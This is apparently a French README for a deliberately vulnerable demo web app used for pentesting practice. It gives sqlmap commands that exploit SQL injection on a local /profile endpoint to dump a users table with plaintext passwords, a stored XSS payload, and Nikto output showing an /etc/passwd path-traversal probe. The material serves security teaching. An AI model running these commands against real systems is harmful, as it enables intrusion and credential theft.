# Pentesting demo

Cette application présente plusieurs vulnérabilités (SQL injection, Insecure Direct Object Reference (IDOR), Cross-Site Scripting (XSS), etc.).

Dans l'exemple ci-dessous, nous utilisons sqlmap pour lister l'ensemble des utilisateurs de la base de données en exploitant la vulnérabilité de type SQL
Injection.

N'hésitez pas à enrichir cet exemple en exploitant les autres vulnérabilités disponibles.
Pour lancer le projet:

```
docker compose up -d
```

L'application possède trois endpoints :

```
http://localhost:8088/login
http://localhost:8088/profile?id=1
http://localhost:8088/logout
```

Nous exploiterons l'endpoint /profile, qui permet d'injecter du SQL via le paramètre de requête id.

Voici les différentes commandes pour sqlmap, ainsi que leurs sorties :

## lister les bases de données de la base mysql:

### Commande:

```
docker compose exec sqlmap python sqlmap.py -u "http://app:8080/profile?id=1"  --dbs --batch
```

### Output:

```
available databases [5]:
[*] appdb
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

## lister les tables de la base de données applicative (`appdb`):

### Commande:

```
docker compose exec sqlmap python sqlmap.py -u "http://app:8080/profile?id=1" -D appdb --tables --batch
```

### Output:

```
[1 table]
+-------+
| users |
+-------+
```

## lister les données de la table `users`:

### Commande:

```
docker compose exec sqlmap python sqlmap.py -u "http://app:8080/profile?id=1" -D appdb -T users --dump --batch
```

### Output:

```
+----+---------------------------------------+---------------+----------+
| id | bio                                   | password      | username |
+----+---------------------------------------+---------------+----------+
| 1  | Hello <script>alert("Hello")</script> | adminpassword | admin    |
| 2  | Bio of User 1                         | password1     | user1    |
| 3  | Bio of User 2                         | password2     | user2    |
| 4  | Bio of User 3                         | password3     | user3    |
| 5  | Bio of User 4                         | password4     | user4    |
| 6  | Bio of User 5                         | password5     | user5    |
| 7  | Bio of User 6                         | password6     | user6    |
| 8  | Bio of User 7                         | password7     | user7    |
| 9  | Bio of User 8                         | password8     | user8    |
| 10 | Bio of User 9                         | password9     | user9    |
+----+---------------------------------------+---------------+----------+
```

## Nikto test

### Commande:

```
docker compose exec -it nikto ./nikto.pl -h  http://app:8080
```

### Output:

```
---------------------------------------------------------------------------
+ Target IP:          172.21.0.4
+ Target Hostname:    app
+ Target Port:        8080
+ Start Time:         2024-11-12 18:54:49 (GMT0)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+ /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
+ /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ /base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ 7857 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-11-12 18:54:54 (GMT0) (5 seconds)
```
